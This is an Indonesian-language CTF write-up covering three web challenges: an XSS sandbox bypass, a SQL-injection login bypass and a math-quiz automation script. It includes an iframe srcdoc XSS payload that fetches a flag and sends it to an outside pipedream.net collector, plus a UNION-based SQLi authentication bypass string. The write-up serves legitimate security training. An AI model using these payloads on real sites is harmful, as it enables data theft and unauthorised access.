# Spiteful XSS - Web
## Description
Everyone keeps exploiting my site, so I deleted all the globals.

## Solve
Pada challenge ini kita akan diberikan website sebagai berikut.
https://spiteful-xss.acmcyber.com/

![](https://i.imgur.com/PJ2vGU9.png)

Website ini vulnerable dengan XSS, tetapi hampir semua builtins function tidak ada yang bisa dipakai.

Saat kita melihat dibagian atas html kita akan melihat script dibawah ini, yang dimana script ini menghapus semua global variable, sehingga kita tidak bisa melakukan XSS.

```html 
<script>
        for (const k in Object.getOwnPropertyDescriptors(window)) {
            delete window[k];
        }
</script>
```

Bagaimana cara membypassnya.

Disini kita bisa menggunakan `iframe`, iframe akan membuat DOM baru dimana disitu kita bisa menggunakan fungsi fungsi builtins yang ada.

Payload XSS:
```html 
<iframe srcdoc="
<script>
    alert(1)
</script>
"></iframe>
```

![](https://i.imgur.com/aA6T8wy.png)


Get flag:
```html 
<iframe srcdoc="
<script>
    fetch('/flag').then(a=>a.text()).then(a=>fetch('https://xxxxxxxx.m.pipedream.net?'+a))
</script>
"></iframe>
```

![](https://i.imgur.com/2vhONLG.png)

# Injection Perfection - Web
## Description
After port scanning the acmcyber site, I found this hidden login page. After bruteforcing I discovered the user: joe, has the password: bruin, but I didn't find anything useful. Can you log in as admin? 

## Solve
Pada source code kita akan melihat endpoint yang vulnerable dengan SQL Injection.

```node 
const attemptLogin = (username, password) => {
	return new Promise((resolve, reject) => {
		db.get(`SELECT username, password FROM users WHERE username='${username}'`, async (err, row) => {
			if (err)
				return reject(err);
			else if (row === undefined)
				return reject('Invalid User');
			else if (password === row.password)
				return resolve(`My favorite color is ${await getFavColor(row.username)}`);
			else
				return reject('incorrect password');
		});
	})
};
...snip..
app.post('/', async (req, res) => {
	const username = req.body.username;
	const password = req.body.password;

	if (!username || !password)
		return res.status(400).send("Invalid Login");
	
	try {
		return res.status(200).send(await attemptLogin(username, password));
	} catch (err) {
		return res.status(400).send(err);
	}
});
```

Pada endpoint tersebut kita bisa mengirimkan post request yang berisi UNION based SQLI seperti berikut untuk membypass authentifikasi.

```
username='UNION/**/SELECT/**/"admin",'asd&password=asd
```

Setelah itu kita akan mendapatkan flagnya di response content.

# Jester - web

```python
from requests import *
import re
import math

url = "https://jester.acmcyber.com/"

# biar tak terjebak karna cookies pas request
session = Session()
r = session.get(url)
cok = session.cookies.get_dict()

# Ronde 1 = Pertambahan
x1 = re.findall("What is (.*) \?<\/p>", r.content.decode('utf-8'))
data = eval(x1[0])

ans = {'answer': data}
print('r1 =', ans)

r1 = session.post(url=url+'validate', data=ans)

# Ronde 2 = Quadratic Equation 
x2 = re.findall("What are the roots of (.*) \?<\/p>", r1.content.decode())

quadratic = re.findall(r'\d+', x2[0])
coefficients = [int(coefficient) for coefficient in quadratic]
coefficients.pop(1)

x = coefficients[0]
y = coefficients[1]
z = coefficients[2]

cal = (y**2) - (4*x*z)

sol1 = (-y - math.sqrt(cal)) / (2*x)
sol2 = (-y + math.sqrt(cal)) / (2*x)

rd1 = round(sol1)
rd2 = round(sol2)

ans2 = {'answer1': rd1, 'answer2': rd2}
print('r2 =',ans2)

r2 = session.post(url=url+'validate', data=ans2)
print(r2.content)
```

# Our Team Writeup

Daffainfo: https://github.com/daffainfo/ctf-writeup/tree/main/CTF%20After%20Dark%20-%20Winter%202023

| Category | Challenge
| --- | --- |
| Intro | Cookies
| Intro | Secure Platform
| Intro | Bagels
| SQLi | Bank
| SQLi | SQL Prevention-101
| LFI | Star Poet Blog

RisyadAR: https://rizsyad.github.io/CTF-WriteUp/#/2023/After%20Dark%20Winter/

- Website
	-    [Birthday](https://rizsyad.github.io/CTF-WriteUp/#/2023/After%20Dark%20Winter/Web/Birthday/)
	-    [Mean Girls](https://rizsyad.github.io/CTF-WriteUp/#/2023/After%20Dark%20Winter/Web/Mean%20Girls/)
	-    [What's on the Menu?](https://rizsyad.github.io/CTF-WriteUp/#/2023/After%20Dark%20Winter/Web/What's%20on%20the%20Menu%3F/)
	-    [Simple Calculator](https://rizsyad.github.io/CTF-WriteUp/#/2023/After%20Dark%20Winter/Web/Simple%20Calculator/)
	-    [No Fetch?!?!](https://rizsyad.github.io/CTF-WriteUp/#/2023/After%20Dark%20Winter/Web/No%20Fetch%3F!%3F!/)

# etc

CTF source code: https://github.com/uclaacm/ctf-after-dark-w23